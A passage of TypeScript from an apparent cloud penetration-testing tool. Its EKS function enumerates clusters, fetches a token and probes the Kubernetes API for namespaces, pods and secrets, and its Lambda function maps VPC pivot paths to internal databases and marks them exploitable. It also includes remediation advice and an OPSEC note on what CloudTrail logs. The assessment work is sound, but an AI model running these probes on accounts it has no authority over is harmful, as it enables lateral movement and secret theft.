  const output: string[] = ["[*] EKS Cluster Lateral Movement Assessment\n"]

  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = tryJson(callerId.stdout)?.Arn || ""
  let sourceArn = callerArn as string
  if (sourceArn.includes(":assumed-role/")) {
    const account = tryJson(callerId.stdout)?.Account || ""
    const rn = sourceArn.split("/")[1] || ""
    sourceArn = `arn:aws:iam::${account}:role/${rn}`
  }
  const sim = await aws(
    [
      "iam", "simulate-principal-policy",
      "--policy-source-arn", sourceArn,
      "--action-names", "eks:ListClusters", "eks:DescribeCluster", "eks:ListAccessEntries", "eks:ListNodegroups",
      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
    ],
    profile, region, timeout,
  )
  if (sim.exitCode === 0) {
    const results = tryJson(sim.stdout) || []
    for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
    output.push("")
  }

  const clusters = await aws(["eks", "list-clusters", "--query", "clusters"], profile, region, timeout)
  if (clusters.exitCode !== 0) return { output: `[-] Cannot list EKS clusters: ${clusters.stderr.trim()}`, findings }
  const clusterNames = (tryJson(clusters.stdout) || []) as string[]
  output.push(`[+] EKS Clusters: ${clusterNames.length}\n`)

  if (clusterNames.length === 0) return { output: output.join("\n"), findings }

  for (const name of clusterNames) {
    output.push(`── ${name} ──`)

    const desc = await aws(["eks", "describe-cluster", "--name", name], profile, region, timeout)
    if (desc.exitCode !== 0) {
      output.push(`    [-] Cannot describe cluster: ${desc.stderr.trim().split("\n")[0]}`)
      continue
    }
    const cluster = tryJson(desc.stdout)?.cluster
    if (!cluster) continue

    const endpoint = cluster.endpoint as string | undefined
    const version = cluster.version as string | undefined
    const status = cluster.status as string | undefined
    const publicAccess = cluster.resourcesVpcConfig?.endpointPublicAccess
    const privateAccess = cluster.resourcesVpcConfig?.endpointPrivateAccess
    const publicCidrs = (cluster.resourcesVpcConfig?.publicAccessCidrs || []) as string[]
    const authMode = cluster.accessConfig?.authenticationMode as string | undefined
    const logging = ((cluster.logging?.clusterLogging || []) as Array<Record<string, unknown>>).find(
      (l) => l.enabled === true,
    )

    output.push(`    Version: ${version}  Status: ${status}`)
    output.push(`    Endpoint: ${endpoint}`)
    output.push(`    Public access: ${publicAccess}  Private access: ${privateAccess}`)
    output.push(`    Auth mode: ${authMode || "CONFIG_MAP"}`)
    if (publicAccess && publicCidrs.includes("0.0.0.0/0")) {
      output.push(`    [!] Public endpoint open to 0.0.0.0/0`)
      findings.push({
        checkId: "AWS-LATERAL-EKS-001",
        provider: "aws",
        severity: "high",
        status: "FAIL",
        resource: `eks://${name}`,
        title: `EKS cluster ${name} has public endpoint open to all`,
        details: `Cluster API server is publicly accessible from 0.0.0.0/0 — anyone with valid credentials can reach it`,
        remediation: "Restrict publicAccessCidrs to specific IPs or disable public endpoint",
      })
    }

    if (!logging) {
      output.push(`    [!] Audit logging disabled — lateral movement will be invisible`)
      findings.push({
        checkId: "AWS-LATERAL-EKS-002",
        provider: "aws",
        severity: "medium",
        status: "FAIL",
        resource: `eks://${name}`,
        title: `EKS cluster ${name} has no audit logging`,
        details: "Cluster logging is disabled — API calls and authentication events are not recorded",
        remediation: "Enable audit and authenticator logging for the EKS cluster",
      })
    }

    const accessEntries = await aws(
      ["eks", "list-access-entries", "--cluster-name", name, "--query", "accessEntries"],
      profile,
      region,
      timeout,
    )
    if (accessEntries.exitCode === 0) {
      const entries = (tryJson(accessEntries.stdout) || []) as string[]
      output.push(`    Access entries: ${entries.length}`)
      for (const entry of entries.slice(0, 15)) {
        const detail = await aws(
          ["eks", "describe-access-entry", "--cluster-name", name, "--principal-arn", entry],
          profile,
          region,
          timeout,
        )
        if (detail.exitCode !== 0) continue
        const ae = tryJson(detail.stdout)?.accessEntry
        if (!ae) continue
        const aType = ae.type as string | undefined
        const kubeGroups = ae.kubernetesGroups as string[] | undefined
        output.push(`      ${entry.split("/").pop()} — type: ${aType}, k8s groups: ${(kubeGroups || []).join(",")}`)

        if ((kubeGroups || []).some((g: string) => g === "system:masters")) {
          findings.push({
            checkId: "AWS-LATERAL-EKS-003",
            provider: "aws",
            severity: "critical",
            status: "FAIL",
            resource: `eks://${name}/${entry.split("/").pop()}`,
            title: `EKS cluster-admin via system:masters: ${entry.split("/").pop()}`,
            details: `Principal ${entry} has system:masters group — full cluster admin privileges`,
            remediation: "Replace system:masters with scoped RBAC ClusterRoleBinding",
          })
        }

        const policies = await aws(
          [
            "eks",
            "list-associated-access-policies",
            "--cluster-name",
            name,
            "--principal-arn",
            entry,
            "--query",
            "associatedAccessPolicies[].{policyArn:policyArn,scope:accessScope.type}",
          ],
          profile,
          region,
          timeout,
        )
        if (policies.exitCode === 0) {
          const pl = tryJson(policies.stdout) || []
          for (const p of pl) {
            const policyName = String(p.policyArn || "").split("/").pop()
            if (policyName === "AmazonEKSClusterAdminPolicy") {
              output.push(`        [!] Has AmazonEKSClusterAdminPolicy (scope: ${p.scope})`)
            }
          }
        }
      }
    }

    const oidcProviders = await aws(
      ["iam", "list-open-id-connect-providers", "--query", "OpenIDConnectProviderList[].Arn"],
      profile,
      region,
      timeout,
    )
    if (oidcProviders.exitCode === 0) {
      const providers = (tryJson(oidcProviders.stdout) || []) as string[]
      const oidcIssuer = (cluster.identity?.oidc?.issuer as string | undefined)?.replace("https://", "")
      const eksProviders = providers.filter((p) => oidcIssuer && p.includes(oidcIssuer.split("/").pop() || "__none__"))

      if (eksProviders.length > 0) {
        output.push(`    IRSA OIDC provider: ${eksProviders[0]}`)

        const roles = await aws(["iam", "list-roles", "--max-items", "200"], profile, region, timeout)
        if (roles.exitCode === 0) {
          const roleList = tryJson(roles.stdout)?.Roles || []
          const irsaRoles: Array<{ name: string; arn: string; ns: string; sa: string }> = []

          for (const role of roleList) {
            const statements = role.AssumeRolePolicyDocument?.Statement || []
            for (const stmt of statements) {
              if (stmt.Effect !== "Allow") continue
              const federated = stmt.Principal?.Federated
              if (!federated || !eksProviders.some((ep) => federated.includes(ep.split("/").pop()!))) continue

              const condition = stmt.Condition?.StringEquals || stmt.Condition?.StringLike || {}
              let sa = "unknown"
              let ns = "unknown"
              for (const [key, val] of Object.entries(condition)) {
                if (key.includes(":sub")) {
                  const parts = String(val).split(":")
                  if (parts.length >= 2) {
                    ns = parts[parts.length - 2] || ns
                    sa = parts[parts.length - 1] || sa
                  }
                }
              }
              irsaRoles.push({ name: role.RoleName, arn: role.Arn, ns, sa })
            }
          }

          if (irsaRoles.length > 0) {
            output.push(`    IRSA roles: ${irsaRoles.length}`)
            for (const ir of irsaRoles) {
              output.push(`      ${ir.name} — ns:${ir.ns} sa:${ir.sa}`)

              const attached = await aws(
                [
                  "iam",
                  "list-attached-role-policies",
                  "--role-name",
                  ir.name,
                  "--query",
                  "AttachedPolicies[].PolicyArn",
                ],
                profile,
                region,
                timeout,
              )
              if (attached.exitCode === 0) {
                const pols = (tryJson(attached.stdout) || []) as string[]
                const dangerous = pols.filter(
                  (p) =>
                    p.includes("AdministratorAccess") ||
                    p.includes("PowerUser") ||
                    p.includes("FullAccess") ||
                    p.includes("AmazonS3FullAccess") ||
                    p.includes("AmazonEC2FullAccess"),
                )
                if (dangerous.length > 0) {
                  output.push(`        [!] Overprivileged: ${dangerous.map((d) => d.split("/").pop()).join(", ")}`)
                  findings.push({
                    checkId: "AWS-LATERAL-EKS-IRSA-001",
                    provider: "aws",
                    severity: "critical",
                    status: "FAIL",
                    resource: `eks://${name}/irsa/${ir.name}`,
                    title: `Overprivileged IRSA role: ${ir.name} (${ir.ns}/${ir.sa})`,
                    details: `Pod in ${ir.ns}/${ir.sa} gets ${dangerous.map((d) => d.split("/").pop()).join(", ")} — compromise this pod to get AWS admin`,
                    remediation: "Apply least-privilege policy; never attach *FullAccess to IRSA roles",
                  })
                }
              }
            }
          }
        }
      } else {
        output.push(`    IRSA: not configured (no OIDC provider for this cluster)`)
      }
    }

    // ── Attempt EKS API access via get-token ──
    if (endpoint) {
      const tokenArgs = ["eks", "get-token", "--cluster-name", name]
      if (profile) tokenArgs.push("--profile", profile)
      if (region) tokenArgs.push("--region", region)
      tokenArgs.push("--output", "json", "--no-cli-pager")
      const tokenResult = await run("aws", tokenArgs, timeout)
      if (tokenResult.exitCode === 0) {
        const tokenData = tryJson(tokenResult.stdout)
        const token = tokenData?.status?.token as string | undefined
        if (token) {
          output.push(`    [+] EKS token obtained: ${token.slice(0, 24)}...`)

          const nsResult = await run("curl", ["-sk", "-m", "10", "-H", `Authorization: Bearer ${token}`, `${endpoint}/api/v1/namespaces`], timeout)
          if (nsResult.exitCode === 0) {
            const nsData = tryJson(nsResult.stdout)
            const nsList = nsData?.items || []
            if (nsList.length > 0) {
              const nsNames = nsList.map((n: Record<string, Record<string, string>>) => n.metadata?.name).filter(Boolean)
              output.push(`    [+] K8s API access CONFIRMED — ${nsNames.length} namespaces: ${nsNames.slice(0, 10).join(", ")}${nsNames.length > 10 ? ` +${nsNames.length - 10} more` : ""}`)

              const podResult = await run("curl", ["-sk", "-m", "10", "-H", `Authorization: Bearer ${token}`, `${endpoint}/api/v1/pods?limit=20`], timeout)
              if (podResult.exitCode === 0) {
                const podData = tryJson(podResult.stdout)
                const podList = podData?.items || []
                if (podList.length > 0) {
                  output.push(`    [+] Pod enumeration: ${podList.length} pods visible`)
                  for (const pod of podList.slice(0, 8)) {
                    const pMeta = pod.metadata || {}
                    const pStatus = pod.status?.phase || "Unknown"
                    const containers = (pod.spec?.containers || []).map((c: Record<string, string>) => c.name).join(",")
                    output.push(`        ${pMeta.namespace}/${pMeta.name} (${pStatus}) — containers: ${containers}`)
                  }
                  if (podList.length > 8) output.push(`        ... +${podList.length - 8} more pods`)
                }
              }

              const secretResult = await run("curl", ["-sk", "-m", "10", "-H", `Authorization: Bearer ${token}`, `${endpoint}/api/v1/secrets?limit=5`], timeout)
              const secretAccess = secretResult.exitCode === 0 && !tryJson(secretResult.stdout)?.message

              findings.push({
                checkId: "AWS-LATERAL-EKS-API-001",
                provider: "aws",
                severity: "critical",
                status: "CONFIRMED",
                resource: `eks://${name}`,
                title: `Full K8s API access on EKS cluster ${name}`,
                details: `Token-based access confirmed: ${nsNames.length} namespaces, ${(tryJson(podResult?.stdout || "{}")?.items || []).length} pods visible${secretAccess ? ", secrets readable" : ""}`,
                remediation: "Review aws-auth ConfigMap and EKS access entries; restrict caller's IAM permissions for eks:*",
              })
            } else if (nsData?.message) {
              output.push(`    [-] K8s API denied: ${String(nsData.message).slice(0, 120)}`)
            }
          } else {
            output.push(`    [-] K8s API unreachable from this network (endpoint may require VPC/private access)`)
          }
        }
      } else {
        output.push(`    [-] Cannot get EKS token: ${tokenResult.stderr.trim().split("\n")[0]}`)
      }
    }

    const nodegroups = await aws(
      ["eks", "list-nodegroups", "--cluster-name", name, "--query", "nodegroups"],
      profile,
      region,
      timeout,
    )
    if (nodegroups.exitCode === 0) {
      const ngs = (tryJson(nodegroups.stdout) || []) as string[]
      output.push(`    Node groups: ${ngs.length}`)
      for (const ng of ngs) {
        const ngDesc = await aws(
          ["eks", "describe-nodegroup", "--cluster-name", name, "--nodegroup-name", ng, "--query", "nodegroup.{role:nodeRole,instanceTypes:instanceTypes,amiType:amiType,desiredSize:scalingConfig.desiredSize}"],
          profile,
          region,
          timeout,
        )
        if (ngDesc.exitCode === 0) {
          const n = tryJson(ngDesc.stdout)
          if (n) {
            output.push(`      ${ng}: ${(n.instanceTypes || []).join(",")} x${n.desiredSize} (${n.amiType})`)
            output.push(`        Node role: ${String(n.role || "").split("/").pop()}`)
          }
        }
      }
    }

    output.push("")
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: ListClusters, DescribeCluster, ListAccessEntries, DescribeAccessEntry, ListNodegroups, DescribeNodegroup`)
  output.push(`  K8s audit: EKS API calls (list namespaces, pods, secrets) logged if cluster audit logging enabled`)
  output.push(`  OPSEC: eks:get-token generates a pre-signed STS URL — no separate CloudTrail event for K8s API calls themselves`)
  return { output: output.join("\n"), findings }
}

export async function lambdaVpcPivot(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] Lambda VPC Network Pivot Analysis\n"]

  const funcs = await aws(
    ["lambda", "list-functions", "--query", "Functions[].[FunctionName,Runtime,Role,VpcConfig]"],
    profile,
    region,
    timeout,
  )
  if (funcs.exitCode !== 0) return { output: `[-] Cannot list Lambda functions: ${funcs.stderr.trim()}`, findings }
  const funcList = tryJson(funcs.stdout) || []

  const vpcFuncs: Array<{
    name: string
    runtime: string
    role: string
    vpcId: string
    subnetIds: string[]
    sgIds: string[]
  }> = []

  for (const f of funcList) {
    const vpc = f[3] as Record<string, unknown> | null
    if (!vpc) continue
    const subnetIds = (vpc.SubnetIds || []) as string[]
    if (subnetIds.length === 0) continue
    vpcFuncs.push({
      name: f[0],
      runtime: f[1],
      role: String(f[2] || "").split("/").pop() || "",
      vpcId: vpc.VpcId as string,
      subnetIds,
      sgIds: (vpc.SecurityGroupIds || []) as string[],
    })
  }

  output.push(`[+] Total functions: ${funcList.length}`)
  output.push(`[+] VPC-attached functions: ${vpcFuncs.length}\n`)

  if (vpcFuncs.length === 0) {
    output.push("[-] No VPC-attached Lambda functions found — no network pivot possible")
    return { output: output.join("\n"), findings }
  }

  const callerId = await aws(["sts", "get-caller-identity", "--query", "Arn", "--output", "text"], profile, region, timeout)
  const callerArn = callerId.exitCode === 0 ? callerId.stdout.trim() : ""

  type InternalTarget = { label: string; port: number; sgIds: string[] }
  const subnetToTargets = new Map<string, InternalTarget[]>()

  function addTarget(subnet: string, target: InternalTarget) {
    if (!subnetToTargets.has(subnet)) subnetToTargets.set(subnet, [])
    subnetToTargets.get(subnet)!.push(target)
  }

  const rdsInstances = await aws(
    [
      "rds",
      "describe-db-instances",
      "--query",
      "DBInstances[].[DBInstanceIdentifier,Engine,Endpoint.Address,Endpoint.Port,DBSubnetGroup.Subnets[].SubnetIdentifier,VpcSecurityGroups[].VpcSecurityGroupId]",
    ],
    profile,
    region,
    timeout,
  )
  if (rdsInstances.exitCode === 0) {
    const dbs = tryJson(rdsInstances.stdout) || []
    for (const db of dbs) {
      const subnets = (db[4] || []) as string[]
      const sgIds = (db[5] || []) as string[]
      const port = Number(db[3]) || 3306
      const label = `RDS:${db[0]}(${db[1]}) → ${db[2]}:${db[3]}`
      for (const s of subnets) addTarget(s, { label, port, sgIds })
    }
  }

  const caches = await aws(
    [
      "elasticache",
      "describe-cache-clusters",
      "--show-cache-node-info",
      "--query",
      "CacheClusters[].[CacheClusterId,Engine,CacheNodes[0].Endpoint.Address,CacheNodes[0].Endpoint.Port,CacheSubnetGroupName,SecurityGroups[].SecurityGroupId]",
    ],
    profile,
    region,
    timeout,
  )
  if (caches.exitCode === 0) {
    const cl = tryJson(caches.stdout) || []
    for (const c of cl) {
      if (!c[4]) continue
      const cacheSgIds = (c[5] || []) as string[]
      const port = Number(c[3]) || 6379
      const subnetGroup = await aws(
        [
          "elasticache",
          "describe-cache-subnet-groups",
          "--cache-subnet-group-name",
          c[4],
          "--query",
          "CacheSubnetGroups[0].Subnets[].SubnetIdentifier",
        ],
        profile,
        region,
        timeout,
      )
      if (subnetGroup.exitCode === 0) {
        const subnets = (tryJson(subnetGroup.stdout) || []) as string[]
        const label = `ElastiCache:${c[0]}(${c[1]}) → ${c[2]}:${c[3]}`
        for (const s of subnets) addTarget(s, { label, port, sgIds: cacheSgIds })
      }
    }
  }

  const opensearch = await aws(
    ["opensearch", "list-domain-names", "--query", "DomainNames[].DomainName"],
    profile,
    region,
    timeout,
  )
  if (opensearch.exitCode === 0) {
    const domains = (tryJson(opensearch.stdout) || []) as string[]
    for (const d of domains) {
      const domainDesc = await aws(
        [
          "opensearch",
          "describe-domain",
          "--domain-name",
          d,
          "--query",
          "DomainStatus.{endpoint:Endpoints,subnets:VPCOptions.SubnetIds,sgIds:VPCOptions.SecurityGroupIds}",
        ],
        profile,
        region,
        timeout,
      )
      if (domainDesc.exitCode === 0) {
        const dd = tryJson(domainDesc.stdout)
        const subnets = (dd?.subnets || []) as string[]
        const osSgIds = (dd?.sgIds || []) as string[]
        const ep = dd?.endpoint ? JSON.stringify(dd.endpoint) : d
        const label = `OpenSearch:${d} → ${ep}`
        for (const s of subnets) addTarget(s, { label, port: 443, sgIds: osSgIds })
      }
    }
  }

  const efsResult = await aws(
    ["efs", "describe-file-systems", "--query", "FileSystems[].[FileSystemId,Name,SizeInBytes.Value]"],
    profile,
    region,
    timeout,
  )
  if (efsResult.exitCode === 0) {
    const fsList = tryJson(efsResult.stdout) || []
    for (const fs of fsList) {
      const targets = await aws(
        [
          "efs",
          "describe-mount-targets",
          "--file-system-id",
          fs[0],
          "--query",
          "MountTargets[].{subnet:SubnetId,ip:IpAddress,MountTargetId:MountTargetId}",
        ],
        profile,
        region,
        timeout,
      )
      if (targets.exitCode === 0) {
        const mts = tryJson(targets.stdout) || []
        for (const mt of mts) {
          const label = `EFS:${fs[0]}(${fs[1] || "unnamed"}) → ${mt.ip}:2049`
          const mtSgIds: string[] = []
          if (mt.MountTargetId) {
            const sgResult = await aws(["efs", "describe-mount-target-security-groups", "--mount-target-id", mt.MountTargetId], profile, region, timeout)
            if (sgResult.exitCode === 0) mtSgIds.push(...(tryJson(sgResult.stdout)?.SecurityGroups || []))
          }
          addTarget(mt.subnet, { label, port: 2049, sgIds: mtSgIds })
        }
      }
    }
  }

  const sgCache = new Map<string, Record<string, unknown>>()
  async function getSg(sgId: string): Promise<Record<string, unknown> | null> {
    if (sgCache.has(sgId)) return sgCache.get(sgId)!
    const r = await aws(["ec2", "describe-security-groups", "--group-ids", sgId], profile, region, timeout)
    if (r.exitCode !== 0) return null
    const sgs = tryJson(r.stdout)?.SecurityGroups || []
    const sg = sgs[0] || null
    if (sg) sgCache.set(sgId, sg)
    return sg
  }

  function sgAllowsEgress(sg: Record<string, unknown>, port: number): boolean {
    const perms = (sg.IpPermissionsEgress || []) as Array<Record<string, unknown>>
    for (const rule of perms) {
      const proto = rule.IpProtocol as string
      if (proto === "-1") return true
      if (proto !== "tcp" && proto !== "6") continue
      const from = (rule.FromPort as number) || 0
      const to = (rule.ToPort as number) || 65535
      if (port >= from && port <= to) return true
    }
    return false
  }

  function sgAllowsIngress(sg: Record<string, unknown>, port: number, sourceSgIds: string[]): boolean {
    const perms = (sg.IpPermissions || []) as Array<Record<string, unknown>>
    for (const rule of perms) {
      const proto = rule.IpProtocol as string
      if (proto !== "-1" && proto !== "tcp" && proto !== "6") continue
      const from = (rule.FromPort as number) || 0
      const to = (rule.ToPort as number) || 65535
      if (proto !== "-1" && (port < from || port > to)) continue
      const pairs = (rule.UserIdGroupPairs || []) as Array<Record<string, string>>
      for (const pair of pairs) {
        if (sourceSgIds.includes(pair.GroupId)) return true
      }
      const ranges = (rule.IpRanges || []) as Array<Record<string, string>>
      for (const range of ranges) {
        if (range.CidrIp === "0.0.0.0/0") return true
      }
    }
    return false
  }

  for (const fn of vpcFuncs) {
    output.push(`── ${fn.name} ──`)
    output.push(`    Runtime: ${fn.runtime}  Role: ${fn.role}`)
    output.push(`    VPC: ${fn.vpcId}`)
    output.push(`    Subnets: ${fn.subnetIds.join(", ")}`)
    output.push(`    Security groups: ${fn.sgIds.join(", ")}`)

    const candidates: InternalTarget[] = []
    for (const sid of fn.subnetIds) {
      const targets = subnetToTargets.get(sid)
      if (targets) candidates.push(...targets)
    }

    const seen = new Set<string>()
    const unique = candidates.filter((t) => {
      if (seen.has(t.label)) return false
      seen.add(t.label)
      return true
    })

    if (unique.length === 0) {
      output.push(`    No known internal resources found in same subnets`)
      output.push("")
      continue
    }

    output.push(`    Internal resources in same subnets: ${unique.length}`)
    let confirmedCount = 0

    for (const target of unique) {
      let egressOk = false
      for (const sgId of fn.sgIds) {
        const sg = await getSg(sgId)
        if (sg && sgAllowsEgress(sg, target.port)) { egressOk = true; break }
      }

      let ingressOk = false
      for (const tSgId of target.sgIds) {
        const sg = await getSg(tSgId)
        if (sg && sgAllowsIngress(sg, target.port, fn.sgIds)) { ingressOk = true; break }
      }

      if (target.sgIds.length === 0) ingressOk = true

      if (egressOk && ingressOk) {
        output.push(`        [+] CONFIRMED: ${fn.name} → ${target.label}  (egress ✓, ingress ✓)`)
        confirmedCount++
      } else if (egressOk && !ingressOk) {
        output.push(`        [-] BLOCKED:   ${fn.name} → ${target.label}  (egress ✓, ingress ✗ — target SG blocks)`)
      } else if (!egressOk) {
        output.push(`        [-] BLOCKED:   ${fn.name} → ${target.label}  (egress ✗ — Lambda SG blocks port ${target.port})`)
      }
    }

    if (confirmedCount > 0) {
      let canInvoke = false
      if (callerArn) {
        const funcArn = `arn:aws:lambda:${region || "us-east-1"}:*:function:${fn.name}`
        const sim = await aws([
          "iam", "simulate-principal-policy",
          "--policy-source-arn", callerArn,
          "--action-names", "lambda:InvokeFunction",
          "--resource-arns", funcArn,
          "--query", "EvaluationResults[0].EvalDecision",
          "--output", "text",
        ], profile, region, timeout)
        if (sim.exitCode === 0 && sim.stdout.trim() === "allowed") canInvoke = true
      }

      if (canInvoke) {
        output.push(`    [!] EXPLOITABLE: Can invoke ${fn.name} to pivot to ${confirmedCount} internal target(s)`)
        output.push(`        → Use: code_exec_lambda --function-name ${fn.name}`)
        findings.push({
          checkId: "AWS-LATERAL-VPC-PIVOT-001",
          provider: "aws",
          severity: "critical",
          status: "EXPLOITABLE",
          resource: `lambda://${fn.name}`,
          title: `Exploitable Lambda pivot: ${fn.name} → ${confirmedCount} internal resource(s)`,
          details: `Current identity can invoke this VPC Lambda and SG rules confirm network path to ${confirmedCount} internal targets — use code_exec_lambda to exploit`,
          remediation: "Restrict lambda:InvokeFunction; tighten Lambda SG outbound and target SG inbound rules",
        })
      } else {
        findings.push({
          checkId: "AWS-LATERAL-VPC-PIVOT-001",
          provider: "aws",
          severity: "medium",
          status: "CONFIRMED",
          resource: `lambda://${fn.name}`,
          title: `Lambda ${fn.name}: SG-confirmed path to ${confirmedCount} internal resource(s)`,
          details: `Network path confirmed via SG analysis but current identity ${canInvoke === false ? "cannot invoke this Lambda" : "invocability unknown"}`,
          remediation: "Restrict Lambda security group outbound rules; ensure databases require IAM/TLS auth",
        })
      }
    }

    output.push("")
  }

  return { output: output.join("\n"), findings }
}
